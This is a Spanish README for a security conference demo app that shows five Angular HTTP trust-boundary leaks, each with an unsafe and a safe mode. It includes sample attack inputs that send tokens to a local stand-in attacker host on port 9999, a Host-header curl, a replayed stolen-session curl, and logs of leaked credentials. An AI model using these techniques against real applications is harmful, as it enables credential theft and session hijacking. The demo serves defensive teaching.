# corner-shop

Demo de la charla **"Más allá de los interceptores: las fronteras de confianza de Angular HTTP"** (DevFest Callao 2026), de Jaime Burgos Tejada ([@SkyZeroZx](https://github.com/SkyZeroZx)).

Una bodega online normal: Angular 22.2 con SSR, hidratación y Service Worker, una API en NestJS y un servidor `attacker` que solo anota lo que le llega. La misma app corre en dos modos:

- `unsafe`: como la entregó el equipo. Nada raro, decisiones que se ven en cualquier proyecto.
- `safe`: mismas pantallas y mismas features. Solo cambian las decisiones de frontera.

Todo corre en tu máquina, en loopback. Los secretos son datos de prueba.

## Requisitos

- Node.js 22.12 o superior (probado con 24.16)
- Chrome o Edge, solo para `npm run verify`

## Correr

```bash
npm install
npm run build
npm start            # modo unsafe
npm run start:safe   # modo safe
```

| Servidor | URL |
| --- | --- |
| shop (Angular SSR) | http://localhost:4000 |
| api (NestJS) | http://localhost:3000/api |
| attacker (NestJS) | http://localhost:9999/__log |

Para correr los cinco labs en los dos modos y ver qué se filtró:

```bash
npm run verify
```

```text
 Lab                                       unsafe    safe
 --------------------------------------------------------------
 1  Token on a URL that "looks relative"   LEAKED    blocked
 2  Host header steers SSR requests        LEAKED    blocked
 3  Custom header follows a redirect       LEAKED    blocked
 4  Private data in shared HTML            LEAKED    blocked
 5  Service Worker cache across users      LEAKED    blocked
```

## La charla y los labs

La charla sigue un `http.get('/api/me')` por cinco fronteras. En cada una hay un advisory de Angular que reporté o arreglé, y un lab que muestra la misma frontera en una app con Angular 22.2.3, con todos los parches.

| Frontera | Lab | Cómo verlo | Advisory |
| --- | --- | --- | --- |
| 1 · La URL: otro parser | 1 | `/promos`, `npm run lab:urls` | [GHSA-jfgx-762w-99vr](https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr) |
| 2 · El SSR: otro proceso | 2, extra | `npm run lab:host` | [GHSA-w739-gvwx-grc3](https://github.com/angular/angular/security/advisories/GHSA-w739-gvwx-grc3), con [su PoC](https://github.com/SkyZeroZx/angular-ssr-router-open-redirect) |
| 3 · Los redirects: otro destino | 3, XHR | `npm run lab:redirect`, `npm run lab:xhr` | [CVE-2026-54264](https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p), [#70540](https://github.com/angular/angular/issues/70540) (sin CVE) |
| 4 · El HTML: otro lector | 4 | `/`, `npm run lab:cache` | [CVE-2026-88059](https://github.com/angular/angular/security/advisories/GHSA-p297-fm68-3q8c), [CVE-2026-54267](https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg) |
| 5 · El Service Worker: otro intermediario | 5 | `/orders`, en el navegador | [CVE-2026-50184](https://github.com/angular/angular/security/advisories/GHSA-95qp-cmmw-mgqv) |

El open redirect del SSR (GHSA-w739) ya está corregido en la versión que usa la demo, así que la charla lo muestra con el PoC. El Lab 2 se queda en el repo como extra: es la otra cara de la misma frontera, el servidor también es cliente.

Los `npm run lab:*` necesitan el stack corriendo (`npm start` o `npm run start:safe`) e imprimen lo mismo que `curl`, sin tener que escribirlo.

### Lab 1: dos parsers, una URL

Una promo del CMS trae `trackUrl: '/\localhost:9999/collect'`. El interceptor de auth decide con un regex que la URL es "nuestra" y le pone el token. El navegador la resuelve con el parser WHATWG y la manda a otro origen.

Sin navegador:

```bash
npm run lab:urls
```

```text
case                        input                               regex says   fetch() sends to        token
backslash                   '/\localhost:9999/collect'          relative     http://localhost:9999   LEAKS
leading tab                 '\t//localhost:9999/collect'        relative     http://localhost:9999   LEAKS
inner line feed             '/\n/localhost:9999/collect'        relative     http://localhost:9999   LEAKS
...
14 of 17 inputs: the regex says "ours", the browser sends them somewhere else.
```

Con navegador: entra como Ana en `/login`, ve a `/promos` y pulsa **Save promo** en "Alfajores -20%". En la terminal:

```text
[attacker] preflight /collect?promo=alfajores  asks for: authorization, content-type  → yes
[attacker] POST /collect?promo=alfajores  authorization=Bearer at_ana_…
```

El `X-XSRF-TOKEN` no aparece: el interceptor XSRF de Angular 22 ya compara orígenes con `new URL()`. El de la app no. El toggle de la página cambia el chequeo en vivo.

CORS no lo frena porque el preflight lo contesta el destino, y aquí el destino es el atacante ([attacker/src/main.ts](apps/attacker/src/main.ts)).

### Lab 2 (extra): el servidor también es cliente

Durante SSR, las URLs relativas se resuelven contra el request entrante. Con `NG_ALLOWED_HOSTS=*`, el header `Host` decide a dónde van.

```bash
npm run lab:host
# equivale a: curl -H "Host: 127.0.0.1:9999" http://localhost:4000/deals
```

```text
HTTP 200
The page your server rendered shows the attacker's deal.
[attacker] GET /api/deals/today  x-internal-key=sk_internal_corner_shop_demo
```

En `safe`, `allowedHosts` responde `400` antes de renderizar y al atacante no le llega nada.

### Lab 3: el redirect que nadie vio

Para el último Cyber Wow, las ofertas del día se publicaron como un JSON en el sitio de la campaña (`cyber.cornershop.pe`) y `/api/deals/today` empezó a responder `302` hacia ese archivo. La campaña terminó y borraron el bucket, pero el CNAME y el redirect se quedaron. Alguien creó un bucket con el mismo nombre, así que ese subdominio ahora es suyo. En la demo, ese alguien es el atacante en `:9999` ([config.ts](apps/api/src/app/config.ts)).

La página es una página normal: `httpResource` y la hidratación de siempre ([deals.ts](apps/shop/src/app/pages/deals/deals.ts)). Durante SSR, el interceptor le pone a cada llamada a la API la llave interna (`X-Internal-Key`) y la sesión del usuario (`X-Session`). `fetch` sigue el redirect y tu interceptor no se entera.

```bash
npm run lab:redirect
# equivale a: curl -b "sid=$ANA" http://localhost:4000/deals
```

```text
The page shows whatever the campaign site serves now.
[attacker] GET /deals/today.json  x-session=sid_ana_…  x-internal-key=sk_internal_corner_shop_demo
```

Y en la terminal del stack:

```text
[ssr] fetch sent       GET http://localhost:4000/api/deals/today  carrying x-session, x-internal-key
[attacker] GET /deals/today.json  x-session=sid_ana_…  x-internal-key=sk_internal_corner_shop_demo
[ssr]   ↪ followed a redirect to http://localhost:9999/deals/today.json
```

El estándar Fetch borra `Authorization` en un redirect a otro origen, y Node además borra `Cookie`. Tus headers propios no. Con esos dos, el atacante llama a la API como si fuera Ana:

```bash
curl -H "X-Internal-Key: sk_internal_corner_shop_demo" -H "X-Session: sid_ana_…" http://localhost:3000/api/me
```

En `safe`, las llamadas a tu API llevan `redirect: 'error'`, en el servidor y en el navegador, y la página dice "Deals unavailable". El subdominio sigue siendo del atacante. Eso se arregla borrando el CNAME y el redirect, no en Angular.

### Lab XHR: el cliente HTTP del servidor

Con `provideHttpClient(withXhr())`, el SSR hace sus requests con `xhr2` (`ServerXhr` de `@angular/platform-server`). Está deprecado desde 22.0.1, 21.2.17 y 20.3.25 y se elimina en Angular 23. La razón es que `xhr2` no maneja bien los redirects: reenvía `Authorization` a otro origen y no corta los loops de redirects. Desde Angular 22, el backend por defecto es `fetch`.

```bash
npm run lab:xhr
```

```text
$ fetch GET http://localhost:3000/api/deals/today
[attacker] GET /deals/today.json  (nothing interesting)

$ xhr2  GET http://localhost:3000/api/deals/today
[attacker] GET /deals/today.json  authorization=Bearer at_ana_…

new URL() resolves it to http://localhost:4000/%C2%A0http://localhost:9999/collect?lab=xhr  same origin
$ xhr2  GET "\u00A0http://localhost:9999/collect?lab=xhr"
[attacker] GET /collect?lab=xhr  authorization=Bearer at_ana_…
```

El mismo Bearer y el mismo 302 a otro origen. `fetch` borra `Authorization`. `xhr2` lo manda.

La segunda parte es [angular/angular#70540](https://github.com/angular/angular/issues/70540), sin CVE. Angular decidía si la URL era absoluta con `String.prototype.trim()`, que también borra espacios Unicode como `U+00A0`, y a `xhr2` le pasaba el string original. Para `new URL()` esa URL es una ruta de tu origen, así que tu interceptor le pone el token. `xhr2` la lee con el parser antiguo de Node y la manda a otro host. Está corregido en 22.1.8 y 22.2.0 ([#70542](https://github.com/angular/angular/pull/70542)), y el PoC está en [angular-serverxhr-poc](https://github.com/SkyZeroZx/angular-serverxhr-poc). El lab llama a `xhr2` directo para mostrar el parser; la app de la demo usa `fetch`.

En una app con SSR, no uses `withXhr()`.

### Lab 4: el HTML también es una API

La home muestra "Hi, Ana" con datos de `/api/me`. En SSR, el interceptor reenvía la sesión como `X-Session`, un header que `HttpTransferCache` no reconoce como credencial. La respuesta termina en `<script id="ng-state">` y el HTML queda en un caché compartido que no mira cookies.

```bash
npm run lab:cache
```

```text
$ curl -b "sid=$ANA" http://localhost:4000/
x-cache: MISS   cache-control: public, max-age=60

$ curl http://localhost:4000/
x-cache: HIT   Hi, Ana Quispe (and her balance, in the HTML and in ng-state)
```

En `safe`, la API marca `/api/me` como `Cache-Control: private, no-store` (Angular 22 ya no lo guarda en TransferCache), el request lleva `transferCache: false` y el render que usó la sesión sale como `private, no-store`: `x-cache: BYPASS` y después `no trace of Ana`.

### Lab 5: el proxy que instalaste

[ngsw-config.json](apps/shop/ngsw-config.json) incluye `/api/orders` en un `dataGroup` con estrategia `performance`. El Service Worker cachea por URL, no por usuario.

1. `npm start`, abre http://localhost:4000/login y recarga una vez para que el Service Worker controle la página.
2. Entra como Ana y abre **Orders**.
3. Sal, entra como Beto y abre **Orders**: "Orders for Ana Quispe".

En `safe`, los requests privados llevan `ngsw-bypass` y el sign-out borra los cachés `ngsw:*:data:*`. El fix de verdad es sacar `/api/orders` del `dataGroup`; eso cambia el build, por eso la demo usa el header.

## Qué cambia en modo `safe`

| Decisión | Dónde |
| --- | --- |
| Comparar orígenes con `new URL()`, no con regex | [auth-interceptor.ts](apps/shop/src/app/http/auth-interceptor.ts), [first-party.ts](apps/shop/src/app/http/first-party.ts) |
| Resolver la URL de la API desde config, no desde el request | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts) |
| La llave interna y la sesión solo en las APIs privadas | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts) |
| `redirect: 'error'` en las llamadas a tu API, en el servidor y en el navegador | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts), [auth-interceptor.ts](apps/shop/src/app/http/auth-interceptor.ts) |
| `transferCache: false` y HTML `private, no-store` si el render usó la sesión | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts) |
| `Cache-Control: private, no-store` en respuestas por usuario | [account.controller.ts](apps/api/src/app/account.controller.ts) |
| `allowedHosts` explícito, sin `*` | [project.json](apps/shop/project.json), [servers.mjs](tools/servers.mjs) |
| `ngsw-bypass` en APIs privadas y limpiar cachés al salir | [auth-interceptor.ts](apps/shop/src/app/http/auth-interceptor.ts), [session-store.ts](apps/shop/src/app/core/session-store.ts) |

El modo se lee de `SAFE=1` en el servidor y viaja al navegador por `TransferState` ([lab-mode.ts](apps/shop/src/app/lab/lab-mode.ts)). Eso es andamiaje de la demo, no un patrón para copiar.

Lo que no cambia entre modos, porque no es parte de ningún lab: la API valida el usuario al entrar, chequea XSRF con double submit ([guards.ts](apps/api/src/app/guards.ts)), acepta `X-Session` solo junto a la llave interna ([sessions.service.ts](apps/api/src/app/sessions.service.ts)) y cierra la sesión en el servidor al salir.

## Estructura

```text
apps/
  shop/        Angular 22.2: SSR, hidratación, HttpTransferCache, Service Worker
    src/server.ts      Express 5: proxy /api, caché de borde, log de fetch salientes
    src/server/        proxy, caché de borde (X-Cache) y logs del SSR
    src/app/http/      los dos interceptores de la charla
    src/app/pages/     home, promos, deals, orders, login
  api/         NestJS: sesión, perfil, pedidos, promos, deals (302 al sitio de la campaña)
  attacker/    NestJS: CORS abierto y un log de lo que llega
tools/
  stack.mjs    levanta los tres servidores
  labs.mjs     Labs 2, 3, 4 y XHR sin escribir curl
  url-lab.mjs  Lab 1 sin navegador
  verify.mjs   los cinco labs, en los dos modos, con Chrome headless
```

## Advisories

### Los míos en esta charla

| Frontera | Advisory | Mi rol |
| --- | --- | --- |
| La URL | [GHSA-jfgx-762w-99vr](https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr): XSRF token leak por discrepancia de parsers (fix incompleto de CVE-2025-66035) | lo encontré |
| El SSR | [GHSA-w739-gvwx-grc3](https://github.com/angular/angular/security/advisories/GHSA-w739-gvwx-grc3): open redirect con URLs protocol-relative en SSR | lo encontré |
| Los redirects | [CVE-2026-54264](https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p): el Service Worker reenviaba headers sensibles en redirects a otro origen | lo arreglé |
| Los redirects | [#70540](https://github.com/angular/angular/issues/70540), sin CVE: `ServerXhr` mandaba a otro origen una URL que `new URL()` daba por propia | lo encontré y lo arreglé |
| El HTML | [CVE-2026-88059](https://github.com/angular/angular/security/advisories/GHSA-p297-fm68-3q8c): bypass de `HttpTransferCache` con `withRequestsMadeViaParent` | lo arreglé |
| El HTML | [CVE-2026-54267](https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg): DOM clobbering de `ng-state` en la hidratación | lo reporté |
| El HTML | [CVE-2026-50556](https://github.com/angular/angular/security/advisories/GHSA-gxx4-3xcv-f8qx): XSS por no escapar `<noscript>` en SSR | lo arreglé |
| El HTML | [CVE-2026-50555](https://github.com/angular/angular/security/advisories/GHSA-hqr9-c56f-3x7f): XSS en SSR: un emoji antes de `</iframe>` corría los índices del escape de Domino | lo analicé |
| El HTML | [CVE-2026-69149](https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v): XSS por contenido raw de fallback sin escapar en SSR | lo arreglé |
| El Service Worker | [CVE-2026-50184](https://github.com/angular/angular/security/advisories/GHSA-95qp-cmmw-mgqv): el Service Worker perdía `credentials` y el modo de caché al rearmar requests | lo arreglé |

Los PoC están en mi GitHub: [angular-xsrf-origin-bypass-poc](https://github.com/SkyZeroZx/angular-xsrf-origin-bypass-poc) y [angular-ssr-router-open-redirect](https://github.com/SkyZeroZx/angular-ssr-router-open-redirect).

### Otros en las mismas fronteras

| Frontera | Advisories |
| --- | --- |
| La URL | [CVE-2025-66035](https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37) |
| El SSR | [CVE-2025-62427](https://github.com/angular/angular-cli/security/advisories/GHSA-q63q-pgmf-mxhr), [CVE-2026-27739](https://github.com/angular/angular-cli/security/advisories/GHSA-x288-3778-4hhx), [CVE-2026-33397](https://github.com/angular/angular-cli/security/advisories/GHSA-vfx2-hv2g-xj5f), [CVE-2026-41423](https://github.com/angular/angular/security/advisories/GHSA-45q2-gjvg-7973), [CVE-2026-46417](https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v), [CVE-2026-50168](https://github.com/angular/angular/security/advisories/GHSA-xrxm-cp7j-8xf6), [CVE-2026-88056](https://github.com/angular/angular/security/advisories/GHSA-f6mr-pjwc-34m4) |
| Los redirects | [CVE-2026-27738](https://github.com/angular/angular-cli/security/advisories/GHSA-xh43-g2fq-wjrj), [CVE-2026-50169](https://github.com/angular/angular/security/advisories/GHSA-gv2q-mqqv-365m) |
| El HTML | [CVE-2026-50170](https://github.com/angular/angular/security/advisories/GHSA-q6f4-qqrg-jv6x), [CVE-2026-54266](https://github.com/angular/angular/security/advisories/GHSA-39pv-4j6c-2g6v), [CVE-2026-68945](https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j) |

La app usa Angular 22.2.3, con todos esos fixes. Lo que se filtra aquí no es un bug de Angular: son decisiones de la app en las mismas fronteras.

## Antivirus que inyectan scripts

Kaspersky (y otros) inyecta un script en cada página, agrega `X-KL-saas-Ajax-Request` a los `fetch()` y responde los preflights CORS por su cuenta. El Lab 1 falla en el navegador con `Request header field authorization is not allowed`. Excluye `localhost` del análisis de tráfico web antes de la demo. `npm run verify` bloquea ese script.

## Versiones

Angular 22.2.3 · Nx 23.3.0 · NestJS 11.2.7 · Express 5.3 · TypeScript 6.0 · Node 24.

NestJS 12 ya salió, pero `@nx/nest` 23.3 declara soporte hasta `<12`. Se queda en 11 para que `npm install` funcione sin flags.

## Licencia

[MIT](LICENSE)
